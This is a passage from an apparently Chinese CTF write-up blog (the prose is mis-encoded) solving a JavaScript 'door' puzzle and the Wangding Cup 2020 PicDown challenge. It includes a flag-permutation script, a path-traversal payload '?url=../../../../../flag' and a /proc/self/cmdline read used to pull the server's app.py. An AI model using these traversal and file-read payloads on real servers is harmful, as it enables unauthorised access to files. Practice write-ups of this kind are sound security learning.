class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;296&quot;</span> /&gt;</span>296<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;297&quot;</span> /&gt;</span>297<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;298&quot;</span> /&gt;</span>298<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;299&quot;</span> /&gt;</span>299<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;300&quot;</span> /&gt;</span>300<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;301&quot;</span> /&gt;</span>301<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;302&quot;</span> /&gt;</span>302<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;303&quot;</span> /&gt;</span>303<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;304&quot;</span> /&gt;</span>304<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;305&quot;</span> /&gt;</span>305<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;306&quot;</span> /&gt;</span>306<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;307&quot;</span> /&gt;</span>307<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;308&quot;</span> /&gt;</span>308<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;309&quot;</span> /&gt;</span>309<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;310&quot;</span> /&gt;</span>310<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;311&quot;</span> /&gt;</span>311<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;312&quot;</span> /&gt;</span>312<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;313&quot;</span> /&gt;</span>313<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;314&quot;</span> /&gt;</span>314<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;315&quot;</span> /&gt;</span>315<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;316&quot;</span> /&gt;</span>316<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;317&quot;</span> /&gt;</span>317<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;318&quot;</span> /&gt;</span>318<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;319&quot;</span> /&gt;</span>319<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;320&quot;</span> /&gt;</span>320<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;321&quot;</span> /&gt;</span>321<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;322&quot;</span> /&gt;</span>322<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;323&quot;</span> /&gt;</span>323<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;324&quot;</span> /&gt;</span>324<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;325&quot;</span> /&gt;</span>325<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;326&quot;</span> /&gt;</span>326<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;327&quot;</span> /&gt;</span>327<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;328&quot;</span> /&gt;</span>328<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;329&quot;</span> /&gt;</span>329<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;330&quot;</span> /&gt;</span>330<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;331&quot;</span> /&gt;</span>331<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;332&quot;</span> /&gt;</span>332<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;333&quot;</span> /&gt;</span>333<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;334&quot;</span> /&gt;</span>334<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;335&quot;</span> /&gt;</span>335<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;336&quot;</span> /&gt;</span>336<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;337&quot;</span> /&gt;</span>337<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;338&quot;</span> /&gt;</span>338<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;339&quot;</span> /&gt;</span>339<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;340&quot;</span> /&gt;</span>340<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;341&quot;</span> /&gt;</span>341<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;342&quot;</span> /&gt;</span>342<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;343&quot;</span> /&gt;</span>343<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;344&quot;</span> /&gt;</span>344<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;345&quot;</span> /&gt;</span>345<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;346&quot;</span> /&gt;</span>346<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;347&quot;</span> /&gt;</span>347<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;348&quot;</span> /&gt;</span>348<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;349&quot;</span> /&gt;</span>349<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;350&quot;</span> /&gt;</span>350<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;351&quot;</span> /&gt;</span>351<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;352&quot;</span> /&gt;</span>352<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;353&quot;</span> /&gt;</span>353<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;354&quot;</span> /&gt;</span>354<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;355&quot;</span> /&gt;</span>355<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;356&quot;</span> /&gt;</span>356<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;357&quot;</span> /&gt;</span>357<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;358&quot;</span> /&gt;</span>358<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;359&quot;</span> /&gt;</span>359<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&quot;check_door()&quot;</span>&gt;</span>Check<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æœ€åº•ä¸‹æœ‰ä¸ª é€šè¿‡ door.js å¼•ç”¨çš„check_door()å‡½æ•°ï¼Œè·Ÿè¿›</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_door</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> all_radio = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;door_form&quot;</span>).elements;<br>  <span class="hljs-keyword">var</span> guess = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; all_radio.length; i++)<br>    <span class="hljs-keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;<br><br>  rand = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">360</span>);<br>  <span class="hljs-keyword">if</span> (rand == guess) <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/open/&quot;</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›è¿™ä¸ª /open/</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>&lt;!DOCTYPE html&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Earth<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/open_sesame.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>YOU FOUND THE DOOR!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>How do you open it?<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/door.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;door&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:60vw;&quot;</span> /&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">      open(0);</span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>è·Ÿè¿›è¿™ä¸ªå¼•ç”¨jsæ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">ms</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params">i</span>) </span>&#123;<br>  sleep(<span class="hljs-number">1</span>).then(<span class="hljs-function">() =&gt;</span> &#123;<br>    open(i + <span class="hljs-number">1</span>);<br>  &#125;);<br>  <span class="hljs-keyword">if</span> (i == <span class="hljs-number">4000000000</span>) <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/fight/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿› /flight/</p><p>å€Ÿä¸€ä¸‹dalaoçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#https://blog.csdn.net/qq_40327508/article/details/110283866</span><br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><br>flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]<br><br>item = permutations(flag)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> item:<br>k = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">list</span>(i))<br><span class="hljs-keyword">if</span> k.startswith(<span class="hljs-string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="hljs-keyword">and</span> k[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br><span class="hljs-built_in">print</span>(k)<br><br><br></code></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p><code>?url=../../../../../flag</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201262347189.png" alt="image-20220126234705722"></p><h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p>å…ˆä¼ å…¥</p><p><code>/proc/self/cmdline</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201262350947.png" alt="image-20220126235052879"></p><p>ç„¶åå»è·å¾—è¿™ä¸ª app.py ç›´æ¥è¾“å…¥app.py å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> 